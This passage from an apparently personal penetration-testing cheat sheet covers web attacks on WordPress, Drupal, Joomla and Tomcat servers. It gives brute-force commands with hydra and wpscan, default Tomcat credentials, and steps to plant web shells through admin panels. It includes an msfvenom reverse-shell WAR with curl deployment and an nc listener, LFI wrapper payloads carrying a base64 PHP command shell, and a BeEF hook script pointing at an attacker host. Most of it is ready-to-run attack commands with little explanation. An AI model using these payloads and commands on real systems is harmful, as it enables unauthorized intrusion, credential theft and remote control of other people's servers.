<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">finger &quot;|/bin/id@&lt;IP&gt;&quot;
finger &quot;|/bin/ls -a /&lt;IP&gt;&quot;</pre><pre class="hljs"><code><span class="hljs-attribute">finger</span> <span class="hljs-string">&quot;|/bin/id@&lt;IP&gt;&quot;</span>
finger <span class="hljs-string">&quot;|/bin/ls -a /&lt;IP&gt;&quot;</span></code></pre></div>
<hr>
<h2 id="http-https-80-443">HTTP - HTTPS - 80 - 443</h2>
<h3 id="automatic-scanners">Automatic scanners</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nikto -h &lt;URL&gt;
python crawleet.py -u &lt;URL&gt; -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20</pre><pre class="hljs"><code>nikto -h <span class="hljs-symbol">&lt;URL&gt;</span>
<span class="hljs-keyword">python</span> crawleet.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-symbol">&lt;URL&gt;</span> -<span class="hljs-keyword">b</span> -d <span class="hljs-number">3</span> -<span class="hljs-keyword">e</span> jpg,png,css -<span class="hljs-keyword">f</span> -<span class="hljs-keyword">m</span> -s -<span class="hljs-keyword">x</span> php,txt -<span class="hljs-keyword">y</span> --threads <span class="hljs-number">20</span></code></pre></div>
<h3 id="wordpress">Wordpress</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Scan
wpscan --rua -e --url &lt;URL&gt;

# Brute force user(s)
wpscan --rua --url &lt;URL&gt; -P &lt;PASSWORDS_LIST&gt; -U &quot;&lt;USER&gt;,&lt;USER&gt;&quot;</pre><pre class="hljs"><code><span class="hljs-comment"># Scan</span>
<span class="hljs-string">wpscan</span> <span class="hljs-built_in">--rua</span> -<span class="hljs-string">e</span> <span class="hljs-built_in">--url</span> &lt;<span class="hljs-string">URL</span>&gt;

<span class="hljs-comment"># Brute force user(s)</span>
<span class="hljs-string">wpscan</span> <span class="hljs-built_in">--rua</span> <span class="hljs-built_in">--url</span> &lt;<span class="hljs-string">URL</span>&gt; -<span class="hljs-string">P</span> &lt;<span class="hljs-string">PASSWORDS_LIST</span>&gt; -<span class="hljs-string">U</span> <span class="hljs-string">&quot;&lt;USER&gt;,&lt;USER&gt;&quot;</span></code></pre></div>
<h4 id="wordpress-panel-rce">Wordpress panel RCE</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Modifying a php from the theme used (admin credentials needed)

Appearance -&gt; Editor -&gt; 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://&lt;IP&gt;/wp-content/themes/twentytwelve/404.php</pre><pre class="hljs"><code>Modifying <span class="hljs-keyword">a</span> php <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> theme used (admin credentials needed)

Appearance -&gt; Editor -&gt; <span class="hljs-number">404</span> Template (<span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span>)
Change <span class="hljs-keyword">the</span> content <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> php <span class="hljs-built_in">shell</span>
<span class="hljs-keyword">https</span>://raw.githubusercontent.com/flozz/p0wny-<span class="hljs-built_in">shell</span>/master/<span class="hljs-built_in">shell</span>.php
<span class="hljs-keyword">http</span>://&lt;IP&gt;/wp-content/themes/twentytwelve/<span class="hljs-number">404.</span>php</code></pre></div>
<h3 id="drupal">Drupal</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">droopescan scan -u &lt;URL&gt;</pre><pre class="hljs"><code>droopescan scan -u <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span></code></pre></div>
<h4 id="username-enumeration">Username enumeration</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/&lt;number&gt; you can see the number of existing users :
    - /user/1 -&gt; Access denied (user exist)
    - /user/2 -&gt; Page not found (user doesn't exist)</pre><pre class="hljs"><code><span class="hljs-keyword">In</span> /<span class="hljs-keyword">user</span>/register just try <span class="hljs-keyword">to</span> <span class="hljs-keyword">create</span> a username <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">is</span> already taken it will be notified :
*The <span class="hljs-type">name</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">is</span> already taken*

<span class="hljs-keyword">If</span> you request a <span class="hljs-built_in">new</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> an existing username :
*Unable <span class="hljs-keyword">to</span> send e-mail. Contact the site administrator <span class="hljs-keyword">if</span> the problem persists.*

<span class="hljs-keyword">If</span> you request a <span class="hljs-built_in">new</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> a non-existent username :
*Sorry, test <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> recognized <span class="hljs-keyword">as</span> a <span class="hljs-keyword">user</span> <span class="hljs-type">name</span> <span class="hljs-keyword">or</span> an e-mail address.*

Accessing /<span class="hljs-keyword">user</span>/&lt;number&gt; you can see the number <span class="hljs-keyword">of</span> existing users :
    - /<span class="hljs-keyword">user</span>/<span class="hljs-number">1</span> -&gt; <span class="hljs-keyword">Access</span> denied (<span class="hljs-keyword">user</span> exist)
    - /<span class="hljs-keyword">user</span>/<span class="hljs-number">2</span> -&gt; Page <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span> (<span class="hljs-keyword">user</span> doesn<span class="hljs-string">&#x27;t exist)</span></code></pre></div>
<h4 id="hidden-pages-enumeration">Hidden pages enumeration</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Fuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 &lt;URL&gt;/node/FUZZ</pre><pre class="hljs"><code>Fuzz /node/<span class="hljs-symbol">&lt;NUMBER&gt;</span> where <span class="hljs-symbol">&lt;NUMBER&gt;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">number</span> (from <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">500</span> <span class="hljs-keyword">for</span> example).
You could <span class="hljs-keyword">find</span> hidden pages (test, dev) which are not referenced by the <span class="hljs-built_in">search</span> engines.

wfuzz -<span class="hljs-keyword">c</span> -<span class="hljs-keyword">z</span> <span class="hljs-built_in">range</span>,<span class="hljs-number">1</span>-<span class="hljs-number">500</span> --hc <span class="hljs-number">404</span> <span class="hljs-symbol">&lt;URL&gt;</span>/node/FUZZ</code></pre></div>
<h4 id="drupal-panel-rce">Drupal panel RCE</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -&gt; (Check) PHP Filter  -&gt; Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select Preview</pre><pre class="hljs"><code>You need the plugin php <span class="hljs-keyword">to</span> be installed (check it accessing <span class="hljs-keyword">to</span> /modules/php <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> it returns a <span class="hljs-number">403</span> <span class="hljs-keyword">then</span>, exists, <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found, <span class="hljs-keyword">then</span> the plugin php isn<span class="hljs-symbol">&#x27;t</span> installed)

Go <span class="hljs-keyword">to</span> Modules -&gt; (Check) PHP Filter  -&gt; Save <span class="hljs-keyword">configuration</span>

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

<span class="hljs-keyword">Then</span> click <span class="hljs-keyword">on</span> Add content -&gt; <span class="hljs-keyword">Select</span> Basic Page <span class="hljs-keyword">or</span> Article -&gt; Write php shellcode <span class="hljs-keyword">on</span> the <span class="hljs-keyword">body</span> -&gt; <span class="hljs-keyword">Select</span> PHP code <span class="hljs-keyword">in</span> <span class="hljs-literal">Text</span> format -&gt; <span class="hljs-keyword">Select</span> Preview</code></pre></div>
<h3 id="joomla">Joomla</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">joomscan -u &lt;URL&gt;
./joomlavs.rb --url &lt;URL&gt; -a -v</pre><pre class="hljs"><code>joomscan -u &lt;URL&gt;
./joomlavs<span class="hljs-selector-class">.rb</span> <span class="hljs-attr">--url</span> &lt;URL&gt; -<span class="hljs-selector-tag">a</span> -v</code></pre></div>
<h3 id="tomcat">Tomcat</h3>
<h4 id="default-credentials">Default credentials</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:&lt;NOTHING&gt;
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat</pre><pre class="hljs"><code>The most interesting <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> Tomcat <span class="hljs-keyword">is</span> /manager/html, inside that <span class="hljs-type">path</span> you can upload <span class="hljs-keyword">and</span> deploy war files (<span class="hljs-keyword">execute</span> code). But  this <span class="hljs-type">path</span> <span class="hljs-keyword">is</span> protected <span class="hljs-keyword">by</span> basic HTTP auth, the most common credentials are :

<span class="hljs-keyword">admin</span>:<span class="hljs-keyword">admin</span>
tomcat:tomcat
<span class="hljs-keyword">admin</span>:&lt;<span class="hljs-keyword">NOTHING</span>&gt;
<span class="hljs-keyword">admin</span>:s3cr3t
tomcat:s3cr3t
<span class="hljs-keyword">admin</span>:tomcat</code></pre></div>
<h4 id="brute-force-3">Brute force</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; http-get /manager/html -vV -u</pre><pre class="hljs"><code>hydra -L <span class="hljs-symbol">&lt;USERS_LIST&gt;</span> -<span class="hljs-keyword">P</span> <span class="hljs-symbol">&lt;PASSWORDS_LIST&gt;</span> -<span class="hljs-keyword">f</span> <span class="hljs-symbol">&lt;IP&gt;</span> http-<span class="hljs-built_in">get</span> /manager/html -vV -<span class="hljs-keyword">u</span></code></pre></div>
<h4 id="tomcat-panel-rce">Tomcat panel RCE</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war

# Upload payload
Tomcat6 :
wget 'http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell' -O -

Tomcat7 and above :
curl -v -u &lt;USER&gt;:&lt;PASSWORD&gt; -T shell.war 'http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true'

# Listener
nc -lvp &lt;PORT&gt;

# Execute payload
curl http://&lt;IP&gt;:8080/shell/</pre><pre class="hljs"><code><span class="hljs-comment"># Generate payload</span>
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-variable">&lt;IP&gt;</span> LPORT=<span class="hljs-variable">&lt;PORT&gt;</span> -f war &gt; shell.war

<span class="hljs-comment"># Upload payload</span>
Tomcat6 :
wget &#x27;http://<span class="hljs-variable">&lt;USER&gt;</span>:<span class="hljs-variable">&lt;PASSWORD&gt;</span><span class="hljs-meta">@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell&#x27;</span> -O -

Tomcat7 and above :
curl -v -u <span class="hljs-variable">&lt;USER&gt;</span>:<span class="hljs-variable">&lt;PASSWORD&gt;</span> -T shell.war &#x27;http://<span class="hljs-variable">&lt;IP&gt;</span>:8080/manager/text/deploy?path=/shellh&amp;update=true&#x27;

<span class="hljs-comment"># Listener</span>
nc -lvp <span class="hljs-variable">&lt;PORT&gt;</span>

<span class="hljs-comment"># Execute payload</span>
curl http://<span class="hljs-variable">&lt;IP&gt;</span>:8080/shell/</code></pre></div>
<h3 id="webdav">WebDav</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">davtest -url &lt;URL&gt;</pre><pre class="hljs"><code>davtest -url <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span></code></pre></div>
<h3 id="http-brute-force-authentication">HTTP brute force authentication</h3>
<h4 id="http-basic-authentication">HTTP basic authentication</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Hydra
hydra -l &lt;USER&gt; -V -P &lt;PASSWORDS_LIST&gt; -s 80 -f &lt;IP&gt; http-get /&lt;URL_ENDPOINT&gt;/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=&lt;URL&gt; user_pass=FILE0 0=&lt;USER:PASSWORD_LIST&gt; -x ignore:code=401 -x ignore:code=307</pre><pre class="hljs"><code><span class="hljs-comment"># Hydra</span>
hydra -l &lt;USER&gt; -V -P &lt;PASSWORDS_LIST&gt; -s 80 -f &lt;IP&gt; http-<span class="hljs-built_in">get</span> /&lt;URL_ENDPOINT&gt;/ -t 15

<span class="hljs-comment"># Patator</span>
python patator.py http_fuzz <span class="hljs-attribute">auth_type</span>=basic <span class="hljs-attribute">url</span>=&lt;URL&gt; <span class="hljs-attribute">user_pass</span>=FILE0 <span class="hljs-attribute">0</span>=&lt;USER:PASSWORD_LIST&gt; -x ignore:<span class="hljs-attribute">code</span>=401 -x ignore:<span class="hljs-attribute">code</span>=307</code></pre></div>
<h4 id="http-get-request">HTTP GET request</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra &lt;IP&gt; -V -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; http-get-form &quot;/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid&quot; -t &lt;THREADS_NUMBER&gt;</pre><pre class="hljs"><code>hydra <span class="hljs-symbol">&lt;IP&gt;</span> -V -<span class="hljs-keyword">l</span> <span class="hljs-symbol">&lt;USER&gt;</span> -<span class="hljs-keyword">P</span> <span class="hljs-symbol">&lt;PASSWORDS_LIST&gt;</span> http-<span class="hljs-built_in">get</span>-form <span class="hljs-string">&quot;/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid&quot;</span> -t <span class="hljs-symbol">&lt;THREADS_NUMBER&gt;</span></code></pre></div>
<h4 id="http-post-request">HTTP POST request</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; http-post-form &quot;/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid&quot; -t &lt;THREADS_NUMBER&gt;</pre><pre class="hljs"><code>hydra -l <span class="hljs-variable">&lt;USER&gt;</span> -P <span class="hljs-variable">&lt;PASSWORDS_LIST&gt;</span> <span class="hljs-variable">&lt;IP&gt;</span> http-post-form <span class="hljs-string">&quot;/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid&quot;</span> -t <span class="hljs-variable">&lt;THREADS_NUMBER&gt;</span></code></pre></div>
<h3 id="spidering-brute-force-directories-files">Spidering / Brute force directories / files</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">gospider -d &lt;DEPTHS&gt; --robots --sitemap -t &lt;THREADS&gt; -s &lt;URL&gt;

ffuf -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/FUZZ -e .php,.txt -t &lt;THREADS&gt;

ffuf -u http://x.x.x.x -w /usr/share/wordlist -H 'Host: FUZZ.x' --fl LINENUMBERtofilter --mc all

Run once to get lines. Adjust --fl variable to get rid of lines
    -u url
    -w wordlist
    -H Header to enumerate
    --fl filter response line  
    --mc matchcode

dirbuster

wfuzz -u http://x.x.x.x -w /op/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.x' --hl LINE

Run once to get lines to hide, adjust hl 

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</pre><pre class="hljs"><code>gospider -d &lt;DEPTHS&gt; --robots --sitemap -t &lt;THREADS&gt; -s &lt;URL&gt;

ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlist/</span>dirbuster<span class="hljs-regexp">/directory-list-lowercase-2.3-medium.txt -u &lt;URL&gt;/</span>FUZZ -e .php,.txt -t &lt;THREADS&gt;

ffuf -u http:<span class="hljs-regexp">//</span>x.x.x.x -w <span class="hljs-regexp">/usr/</span>share/wordlist -H <span class="hljs-string">&#x27;Host: FUZZ.x&#x27;</span> --fl LINENUMBERtofilter --mc all

Run once to get lines. Adjust --fl variable to get rid of lines
    -u url
    -w wordlist
    -H Header to enumerate
    --fl filter response line  
    --mc matchcode

dirbuster

wfuzz -u http:<span class="hljs-regexp">//</span>x.x.x.x -w <span class="hljs-regexp">/op/</span>SecLists<span class="hljs-regexp">/Discovery/</span>DNS/subdomains-top1million-<span class="hljs-number">5000</span>.txt -H <span class="hljs-string">&#x27;Host: FUZZ.x&#x27;</span> --hl LINE

Run once to get lines to hide, adjust hl 

Dictionaries :
   - <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt
   - <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/big.txt
   - <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt</code></pre></div>
<h4 id="file-backups">File backups</h4>
<p>Once you have found all the files, look for backups of all the executable files (&quot;<em>.php</em>&quot;, &quot;<em>.aspx</em>&quot;...). Common variations for naming a backup are</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old</pre><pre class="hljs"><code>file.ext~, file<span class="hljs-selector-class">.ext</span><span class="hljs-selector-class">.bak</span>, file<span class="hljs-selector-class">.ext</span><span class="hljs-selector-class">.tmp</span>, file<span class="hljs-selector-class">.ext</span><span class="hljs-selector-class">.old</span>, file<span class="hljs-selector-class">.bak</span>, file<span class="hljs-selector-class">.tmp</span> and file.old</code></pre></div>
<h3 id="local-file-inclusion-remote-file-inclusion-lfi-rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/File%<span class="hljs-number">20</span>Inclusion</code></pre></div>
<h4 id="wrappers">Wrappers</h4>
<h5 id="wrapper-phpfilter">Wrapper php://filter</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">http://example.com/index.php?page=php://filter/convert.base64-encode/resource=</pre><pre class="hljs"><code>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=</code></pre></div>
<h5 id="wrapper-expect">Wrapper expect://</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">http://example.com/index.php?page=expect://id</pre><pre class="hljs"><code>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=expect:/</span><span class="hljs-regexp">/id</span></code></pre></div>
<h5 id="wrapper-data">Wrapper data://</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">echo '&lt;?php phpinfo(); ?&gt;' | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
    - exec
    - shell_exec
    - system
    - passthru
    - popen

# Exemple
echo '&lt;?php passthru($_GET[&quot;cmd&quot;]);echo &quot;Shell done !&quot;; ?&gt;' | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is &quot;Shell done !&quot; on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls</pre><pre class="hljs"><code><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren&#x27;t disable.

Code execution with 
    - exec
    - shell_exec
    - system
    - passthru
    - popen

# Exemple
echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> passthru(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Shell done !&quot;</span>; <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is &quot;Shell done !&quot; on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls</span></code></pre></div>
<h5 id="wrapper-input">Wrapper input://</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">curl -k -v &quot;http://example.com/index.php?page=php://input&quot; --data &quot;&lt;?php echo shell_exec('id'); ?&gt;&quot;</pre><pre class="hljs"><code><span class="language-xml">curl -k -v &quot;http://example.com/index.php?page=php://input&quot; --data &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-string">&#x27;id&#x27;</span>); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span></code></pre></div>
<h4 id="useful-lfi-list">Useful LFI list</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Linux
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</pre><pre class="hljs"><code><span class="hljs-comment"># Linux</span>
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Fuzzing<span class="hljs-regexp">/LFI/</span>LFI-gracefulsecurity-linux.txt

<span class="hljs-comment"># Windows</span>
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Fuzzing<span class="hljs-regexp">/LFI/</span>LFI-gracefulsecurity-windows.txt

<span class="hljs-comment"># Both</span>
<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Fuzzing<span class="hljs-regexp">/LFI/</span>LFI-LFISuite-pathtotest-huge.txt</code></pre></div>
<h4 id="tools">Tools</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">kadimus --url &lt;URL&gt;
python lfisuite.py</pre><pre class="hljs"><code>kadimus --url <span class="hljs-symbol">&lt;URL&gt;</span>
<span class="hljs-keyword">python</span> lfisuite.<span class="hljs-keyword">py</span></code></pre></div>
<h3 id="command-injection">Command injection</h3>
<p>For command injection always use BurpSuite !</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/Command%<span class="hljs-number">20</span>Injection</code></pre></div>
<h3 id="deserialization">Deserialization</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/Insecure%<span class="hljs-number">20</span>Deserialization</code></pre></div>
<h3 id="file-upload">File upload</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/Upload%<span class="hljs-number">20</span>Insecure%<span class="hljs-number">20</span>Files</code></pre></div>
<h3 id="sql-injection">SQL injection</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/SQL%<span class="hljs-number">20</span>Injection

https:<span class="hljs-regexp">//</span>cobalt.io<span class="hljs-regexp">/blog/</span>a-pentesters-guide-to-sql-injection-sqli</code></pre></div>
<h3 id="xss">XSS</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings<span class="hljs-regexp">/tree/m</span>aster/XSS%<span class="hljs-number">20</span>Injection

beef-xss
cat <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/beef-xss/</span>config.yaml | grep user -C <span class="hljs-number">1</span> <span class="hljs-comment"># user / password</span>
&lt;script src=<span class="hljs-string">&quot;http://&lt;IP&gt;:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</code></pre></div>
<h3 id="other-web-vulnerabilities">Other web vulnerabilities</h3>
